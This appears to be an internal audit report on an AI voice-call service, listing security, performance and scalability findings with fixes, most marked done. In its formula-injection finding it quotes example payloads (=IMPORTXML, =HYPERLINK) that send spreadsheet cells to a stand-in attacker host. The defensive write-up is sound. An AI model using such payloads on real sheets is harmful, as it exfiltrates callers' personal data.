## Executive summary

The single most dangerous item is a hard scalability bug, not a slow-burn one: SC1 (in-process pending_calls bridge) silently drops a fraction of live inbound calls the instant a second app machine exists, which already happens on every rolling deploy, with no fallback. It is also a 1-line-class, $0 fix and must ship first. On performance, P1 runs blocking redaction (sync Anthropic + spaCy NER) and two synchronous SQLite writes on the event loop at every hang-up, freezing all other concurrent live calls during the worst possible window and is the leading suspect for the choppy-audio / Twilio 31921 symptom under investigation. On security, the worst is the privacy stack: S1/S2/S3 mean residual PII can be written UNREDACTED to SQLite and streamed in cleartext to Fly logs (which have no deletion path), while the redacted store of record is never purged at all, directly breaking the published 90-day-deletion and "raw transcripts never persisted" promises, plus S5 lets any caller inject live Google Sheets formulas (=IMPORTXML/IMPORTRANGE) to exfiltrate other callers' PII. Every single finding is $0 and code/config-only, there is no paid-infrastructure spend required to fix anything here; the only split is effort (most are Small, three are Medium). Do the security + performance + SC1 high-severity Small fixes immediately, then the four Medium-effort items (S3 retention, S9 non-root container, S17 multi-stage image, SC7 health check note is Small).

## Detail: impact + fix

### [SC1] CRITICAL · scalability, pending_calls bridge is in-process; a 2nd Fly machine breaks the /twilio/voice -> /twilio/stream handoff and drops the call, ✅ DONE (verified in code 2026-06-10: signed to/sig/exp stream params are the primary resolution path; pending_calls is a same-machine deploy-window fallback only)
- **Location:** `tools/llm_proxy/voice_routes.py 169-170, 250-259`
- **Effort/Cost:** S / 0 dollars, code only
- **Impact:** The instant a 2nd machine exists (autoscale burst, or a rolling deploy where old+new coexist), a fraction of inbound calls silently drop at stream-connect with code 1002. No fallback exists, so this is a hard call-drop, not degraded experience, the single biggest horizontal-scaling blocker: the entire voice path assumes one process.
- **Fix:** Pass the To number as a TwiML Stream Parameter, the pattern already used for the caller number where the POST passes from at 176-177 and the WS reads customParameters at 226-227. Add a stream parameter named to with the to_number value in the voice POST, read it from start customParameters in the stream WS, and resolve client_ctx from state.clients by that number directly. Delete the pending_calls write, pop, prune, and the started_at dict. state.clients is built identically on every machine at startup so the lookup is machine independent. Alternative is Redis keyed by call_sid with short TTL. Interim stopgap only: scale to one app machine and use an immediate deploy strategy so old and new app machines never coexist.

### [S1] HIGH · security, Audit-detected residual PII is persisted UNREDACTED to SQLite and logged in cleartext (quarantine flag is metadata only), ✅ DONE 2026-06-01
- **Location:** `tools/redact_pii.py + tools/llm_proxy/voice_pipeline.py redact_pii.py:135-139, 241-284; voice_pipeline.py:217-240`
- **Effort/Cost:** S / $0
- **Impact:** Any caller phone number, email, SSN, or address that NER + the Haiku contextual pass fail to catch (the audit's entire reason for existing) is written to /data/transcripts.db AND emitted to Fly logs in cleartext, while the row is misleadingly labeled 'redacted'. Direct PII leak into the durable store and the log aggregator; breaks the GDPR/PIPA redaction guarantee.
- **Fix:** Mask residual spans before persisting and logging, or refuse to write the body when residuals exist.

### [S2] HIGH · security, Full call transcript content logged to stdout (Fly log stream) on every retained call, ✅ DONE 2026-06-01
- **Location:** `tools/llm_proxy/voice_pipeline.py 219-226`
- **Effort/Cost:** S / $0
- **Impact:** Transcript content (and raw residual PII in the quarantine case) is duplicated into Fly's log retention with no deletion path and broader operator/aggregator access than the controlled SQLite store, undermining the data-minimization and 90-day-deletion commitments in PRIVACY_NOTICE_DRAFT.md.
- **Fix:** Drop `content=%r`/result.redacted_text from the production log line at voice_pipeline.py:219-226; the SQLite row written immediately after (transcript_store.save, lines 229-240) is the durable system of record. Log only residuals=len(result.residuals), counts=result.counts, and len(result.redacted_text). If raw content logging is ever needed for debugging, gate it behind an explicit env flag (e.g. LOG_TRANSCRIPT_CONTENT) that is off in production. This removes the uncontrolled duplicate-persistence surface and, critically, stops raw residual PII from being written to Fly stdout in the quarantine case.

### [S3] HIGH · security, SQLite redacted-transcript store has no retention/purge, contradicts the 90-day-deletion privacy commitment, ✅ DONE 2026-06-01
- **Location:** `tools/llm_proxy/transcript_store.py + tools/retention_enforcer.py transcript_store.py:31-55, 77-127; retention_enforcer.py:46-50, 81-167`
- **Effort/Cost:** M / $0
- **Impact:** Redacted (and, per S1, sometimes un-redacted) transcripts accumulate in /data/transcripts.db forever. The stated 90-day deletion is not enforced for the actual store of record, a GDPR/PIPA storage-limitation and accuracy-of-notice violation, and a DSAR/erasure-request liability (no code path can delete a caller's records).
- **Fix:** Add purge_expired(retention_days=90, db_path=None) to transcript_store.py issuing `DELETE FROM transcripts WHERE created_at < ?` (created_at is already an ISO-8601 Z string, so a lexicographic comparison against a computed cutoff string works correctly). Also add delete_by_call_sid / delete_by_caller_last4 helpers for DSAR erasure and wire them into tools/data_subject_request.py (currently it deletes only Sheet rows). CRITICAL: do NOT just call purge from run_daily_retention.py as the reporter suggested, the retention Fly process has no /data mount (fly.toml:32 scopes the volume to processes=["app"]). Either (a) add `processes = ["app", "retention"]` to the [[mounts]] block so the scheduled machine can attach the volume, or (b) run the purge from inside the app process (e.g. a daily threading.Timer / startup-scheduled task in main.py) which already has the volume mounted. Update DSAR receipts to include matched transcript rows so erasure is provable.

### [S5] HIGH · security, Google Sheets formula injection via caller-controlled tool-call fields (USER_ENTERED), ✅ DONE 2026-06-01
- **Location:** `tools/llm_proxy/sheets_writer.py 149-163, 242-255 (append_row / append_to_tab); format_row 70-101`
- **Effort/Cost:** S / $0
- **Impact:** A caller stating a name/address/note like `=HYPERLINK("https://evil.example/x","Click for booking")`, `=IMPORTXML("https://evil/?d="&A2&B2, "//x")`, or `=IMPORTRANGE(...)` gets that formula executed in the owner's sheet on open. IMPORTXML/IMPORTRANGE can exfiltrate adjacent cells (other callers' PII) to an attacker URL; HYPERLINK enables phishing of triage staff. Stored formula-injection -> PII exfiltration against a GDPR/PIPA dataset, exploitable by anyone who can dial the number.
- **Fix:** Change valueInputOption from "USER_ENTERED" to "RAW" in append_row (sheets_writer.py:158) and append_to_tab (sheets_writer.py:248) so caller-supplied text is stored as literal strings, never evaluated as formulas. Header/template writes (ensure_header :142, ensure_tab :233) and update_voicemail_transcript (:345) already use RAW and need no change. If any future use case genuinely needs formulas in those appends, instead sanitize per-cell by prefixing a leading apostrophe to any string value starting with = + - @ (and stripping/escaping leading tab/CR) before append; that defense belongs in format_row and the voicemail/digest row builders. RAW is the simpler, complete fix here since none of these rows are intended to contain user-authored formulas.

### [S7] HIGH · security, No rate limit / lockout on /auth/demo and non-constant-time credential compare, unlimited credential brute force, ✅ DONE 2026-06-01
- **Location:** `tools/llm_proxy/main.py 162-164, 333-349, 351-352`
- **Effort/Cost:** S / $0
- **Impact:** On a single shared-cpu-1x machine an attacker can run unlimited password guesses at full request throughput against the demo credentials. A successful guess yields an 8h bearer token granting access to the paid Anthropic /text-chat path (cost amplification). Each guess also incurs full request + middleware-logging overhead, adding CPU/log pressure. The != compare is theoretically timing-observable.
- **Fix:** Add `@limiter.limit("5/minute;20/hour")` to auth_demo (keyed per IP) plus a short per-IP/per-username lockout after N consecutive failures. Replace the credential equality checks with `secrets.compare_digest` (or `hmac.compare_digest`) for both username and password, computing both comparisons unconditionally to avoid short-circuit leakage. Pass `default_limits=["60/minute"]` to the Limiter so new routes are throttled by default. Separately (recommended), set the SlowAPI key_func to a callable that prefers cf-connecting-ip so throttling keys on the true client IP rather than the shared Cloudflare edge address, otherwise both the new auth limit and the existing /text-chat 30/hour limit are bypassable/over-broad behind Cloudflare.

### [P1] HIGH · performance, End-of-call finally block runs blocking redaction (sync Anthropic + spaCy NER) and two synchronous SQLite writes on the event loop, stalling every concurrent call, ✅ DONE 2026-06-01
- **Location:** `tools/llm_proxy/voice_pipeline.py 425-459 (finally block); 437-440 save_minute_counter; 230 transcript_store.save; redact_pii.py:114-139, 159-216, 205-209; transcript_store.py:96-118, 142-159`
- **Effort/Cost:** S / $0
- **Impact:** Every call end freezes the entire event loop for the full spaCy NER pass plus a 1-5s synchronous Haiku round-trip plus synchronous SQLite commits (and up to 5s of SQLite-lock wait when two calls end near-simultaneously). During that window no other coroutine runs: concurrent live calls' Media Stream WS frames (Deepgram STT in / Cartesia TTS out / VAD) stall, /twilio/voice POSTs for new inbound calls queue, and the WS that just ended cannot close promptly. Under even 2-3 simultaneous calls a single hang-up degrades the others, this is the exact choppy/distorted-audio, dropped-frames, '3 beeps'/Twilio 31921 symptom under investigation. Service-down-under-normal-load for a real-time voice product.
- **Fix:** Offload the entire blocking tail off the event loop. In voice_pipeline.py's finally block wrap both calls: `await asyncio.to_thread(transcript_store.save_minute_counter, client_id=..., total_minutes=...)` and `await asyncio.to_thread(_persist_redacted_transcript, call_sid=..., messages=..., retain=..., ...)`. Both targets are already thread-safe off-loop (sqlite connections opened with check_same_thread=False under the module Lock; the sync Anthropic client is fine in a worker thread), and best-effort error swallowing inside them is preserved. This fully resolves the event-loop stall. Optional follow-up to cut per-hangup latency and cost: set use_contextual_pass=False on the live path (Presidio + deterministic audit already redact) or switch the contextual pass to AsyncAnthropic and await it. Also consider warming the redactor in main.py:_build_app so the first post-restart call-end doesn't pay the spaCy load on a worker thread spike.

### [SC5] HIGH · scalability, Minute ceiling is admission-control TOCTOU: only completed calls are counted, so concurrent in-flight calls all pass a stale check and blow past the cap, ✅ DONE 2026-06-01
- **Location:** `tools/llm_proxy/voice_routes.py + tools/llm_proxy/voice_pipeline.py voice_routes.py:145-159 (check); voice_pipeline.py:426-440 (increment)`
- **Effort/Cost:** S / $0
- **Impact:** Cost/cap overrun. With ceiling=200 and used at 199, every call arriving before any in-progress call ends is admitted. Up to ~25 concurrent calls can each be admitted against the same stale total and run full length. Overshoot ≈ (concurrent_admitted-1)*avg_call_minutes, e.g. 25 concurrent 8-minute calls = ~190 minutes past the 200 ceiling, every minute incurring real Anthropic/Deepgram/Cartesia/Twilio spend. The cap does not actually bound per-period cost under any concurrency burst.
- **Fix:** Reserve minutes at admission instead of charging only at completion. Add a per-client in-flight reservation dict on app.state (e.g. reserved_minutes or active_calls). In /twilio/voice, right after the ceiling check passes and before returning the streaming TwiML, synchronously bump the reservation for that client (a fixed per-call estimate, or just an active-call count); gate the admission on used + reserved >= minute_ceiling. Decrement the reservation in run_voice_session's finally block when the actual minutes are charged. Because everything runs on one event loop with no await between the check and the synchronous reservation bump, no lock is needed. Optionally add a lightweight mid-call check (e.g. an event handler or periodic task) that queues EndTaskFrame once minute_counters + reserved crosses the ceiling, so a single long call cannot overrun unbounded after it passes the cap.

### [S11] MEDIUM · security, Host-header fallback can poison the Media Stream WS URL and voicemail callback URLs (no TrustedHostMiddleware), ✅ DONE
- **Location:** `tools/llm_proxy/voice_routes.py + tools/llm_proxy/voicemail.py voice_routes.py:46-59 (used at 172-175); voicemail.py:44-59`
- **Effort/Cost:** S / $0
- **Impact:** Latent host-header-injection sink: any deploy/region/preview where the secret is missing silently trusts an attacker-controllable Host to route Twilio media + transcript callbacks, leaking call audio and transcripts (PII), enabling cache poisoning or routing Twilio to a hostile WS endpoint. Bounded because healthz requires PUBLIC_BASE_URL and _default_voicemail_url raises without it, so a correctly-deployed machine ignores the header, gated on misconfiguration.
- **Fix:** Fail closed in production: make _public_base_url (both files) require PUBLIC_BASE_URL and raise instead of trusting X-Forwarded-Host/Host, gating the header fallback behind an explicit dev flag (e.g. ALLOW_HEADER_HOST=1) the same way _default_voicemail_url already requires PUBLIC_BASE_URL. Additionally add Starlette TrustedHostMiddleware(allowed_hosts=[<app>.fly.dev, ...]) in main.py to reject mismatched Host headers as defense-in-depth. Since --forwarded-allow-ips '*' makes X-Forwarded-* attacker-influenced, never derive a stream/callback host from an untrusted header; prefer the configured PUBLIC_BASE_URL exclusively.

### [S15] MEDIUM · security, No request body size limit, Starlette/uvicorn accept arbitrarily large POST bodies, ✅ DONE (Content-Length check + chunked-body receive cap, 2026-06-10)
- **Location:** `tools/llm_proxy/main.py 145-174`
- **Effort/Cost:** S / $0
- **Impact:** A single attacker can POST a multi-hundred-MB body (e.g. to /auth/demo or /twilio/voice, parsed before/without auth) and force the process to buffer it in RAM. A few concurrent large bodies on the 1GB machine can OOM-kill the process, dropping all in-progress live calls. The unbounded text_chat messages list also lets an authenticated user send a huge prompt to Anthropic (cost amplification).
- **Fix:** Add a small ASGI middleware that rejects requests whose Content-Length exceeds a low cap (e.g. 64KB for JSON/form endpoints) with HTTP 413, and that also enforces the cap on streamed/chunked bodies (no Content-Length) by counting bytes. Place it early in the middleware stack so it runs before route handlers (and before request.form()/request.json() materialize the body). Additionally add validators to TextChatRequest: cap len(messages) (e.g. <= 50) and total/per-message content length (e.g. <= 16KB total) via pydantic field validators. Twilio webhook bodies are tiny (well under 64KB), so the cap won't break legitimate traffic. This is code-only; no infra/compute changes needed.

### [S4] MEDIUM · security, Single ALLOW_UNSIGNED_TWILIO flag disables Twilio signature validation on every webhook simultaneously, ✅ DONE
- **Location:** `tools/llm_proxy/voice_routes.py 98-103`
- **Effort/Cost:** S / $0
- **Impact:** If the flag is left/turned on in production (single typo in Fly secrets), every Twilio webhook accepts forged unauthenticated POSTs: forge /twilio/voice to drive the AI pipeline (Anthropic/Deepgram/Cartesia spend), forge recording+transcription callbacks to write attacker-controlled rows into the customer's Google Sheet and send owner SMS with attacker text. Because /healthz reports 'ok' with the bypass active, the misconfiguration is not surfaced by monitoring.
- **Fix:** Make ALLOW_UNSIGNED_TWILIO refuse to honor itself unless a separate explicit non-production marker is also present (e.g. require APP_ENV != "production" or IS_DEV=1) in the shared bypass branch at voice_routes.py:99 and voicemail.py:71, factor it into one helper so both validators stay in sync. Additionally, change main.py:316 so the /healthz 'twilio_signature' check reports degraded (not ok) whenever the bypass is active in a production environment, surfacing the misconfiguration to monitoring instead of masking it. Keep the bypass strictly local-dev-only.

### [S6] MEDIUM · security, Forgeable client IP (X-Forwarded-For / CF-Connecting-IP) via uvicorn --forwarded-allow-ips '*', defeats the rate limiter and poisons audit logs, ✅ DONE
- **Location:** `tools/llm_proxy/main.py + infra/fly/entrypoint.sh main.py:133-138 (_real_ip), 162-164 (Limiter key_func), 170-171 (request log), 346-348 & 363-366 (demo logging); entrypoint.sh:16-20`
- **Effort/Cost:** S / $0
- **Impact:** Rate-limit bypass: rotating a fake X-Forwarded-For resets the 30/hour budget per request, enabling unbounded Claude API calls through /text-chat after one demo login (cost amplification, worsened by uncapped TextChatRequest.messages). Audit/log integrity is lost: forged IPs poison request logs and demo_visitors.csv, undermining abuse investigation and the GDPR access-log trail.
- **Fix:** Stop trusting arbitrary upstreams. In entrypoint.sh set `--forwarded-allow-ips` to the single trusted hop instead of '*', for fly-proxy this is the loopback/private peer, e.g. `--forwarded-allow-ips '127.0.0.1'` (or Fly's documented internal proxy address), so client.host reflects the real edge-attributed client rather than the leftmost client-supplied XFF. Stop honoring cf-connecting-ip in both _real_ip (main.py:135) and the request logger (main.py:170) since no Cloudflare fronts the API; derive the client IP from request.client.host (now correctly populated) or peel exactly one trusted-proxy hop from the right of XFF, and use that single hardened helper as both the slowapi key_func and the audit-log IP. As defense-in-depth, cap TextChatRequest.messages count and per-message content length (pydantic max_length / a validator) in text_chat_handler.py. All code/config only, $0.

### [S8] MEDIUM · security, Rate limiter has no default_limits, /twilio/*, /vm/*, voicemail callbacks, /healthz all unthrottled; /twilio/voice parses body before signature check, ✅ DONE
- **Location:** `tools/llm_proxy/main.py 162-164`
- **Effort/Cost:** S / $0
- **Impact:** Any of these endpoints can be flooded with no throttle on the single never-auto-stopping machine. /twilio/voice parses the full form body before signature rejection, so a high-rate POST flood with large bodies burns CPU/RAM on form parsing plus per-request logging, degrading or downing the one shared-cpu-1x machine that also serves live calls.
